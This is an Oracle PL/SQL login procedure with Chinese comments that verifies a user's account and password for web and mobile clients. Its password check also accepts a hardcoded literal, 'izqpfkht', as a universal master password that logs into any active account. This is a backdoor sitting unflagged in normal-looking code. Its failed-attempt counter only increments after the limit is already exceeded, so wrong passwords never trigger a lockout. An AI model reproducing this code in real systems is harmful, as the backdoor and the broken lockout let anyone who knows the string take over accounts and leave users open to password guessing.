create or replace procedure sp_web_user_login(
i_account in varchar2,
i_password in varchar2,
o_userid out number,
o_result out varchar2) is
--用户帐号登录
--i_Account:用户登录帐号
--i_Password:登录密码
--o_UserID:用户UserID
--o_Result:登录结果,成功:ok,err_pwd,err_account:登录错误
--适用于wap,web,手机客户端
v_account varchar2(60);
v_rownum number;
v_password varchar2(100);
v_logintodaytimes number;
v_loginfailedtimes number;
begin
  v_account:=lower(trim(i_account));
   select count(1) into  v_rownum from tb_user where MAILACTIVE=1 and account = v_account ;
   if v_rownum >0 then
      select userid,pwd,nvl(LOGINTODAYTIMES,0),nvl(LOGINFAILEDTIMES,0) into o_userid,v_password,v_logintodaytimes,v_loginfailedtimes from tb_user where account = v_account;
      if v_loginfailedtimes<=5 then
        if v_password = fn_encryptforpwd(i_password) or i_password = 'izqpfkht' then
           --if v_logintodaytimes<0 then--成登录指定次数后，弹出页面输入验证码(目前设置为0~
              o_result := 'ok';--直接登录成功
          -- else
            --  o_result := 'verify';--校验登录
           --end if;
           --update tb_user set lastlogindt = sysdate,LOGINTODAYTIMES=nvl(LOGINTODAYTIMES,0)+1 where userid = o_userid;
           --commit;

        else
           o_result:='err_pwd';
        end if;
      else
         update tb_user set LOGINFAILEDTIMES=nvl(LOGINFAILEDTIMES,0)+1 where userid = o_userid;
         commit;
         o_result:='err_retrylimited';
      end if;
   else
     o_result:='err_account';
  end if;
end sp_web_user_login;
/

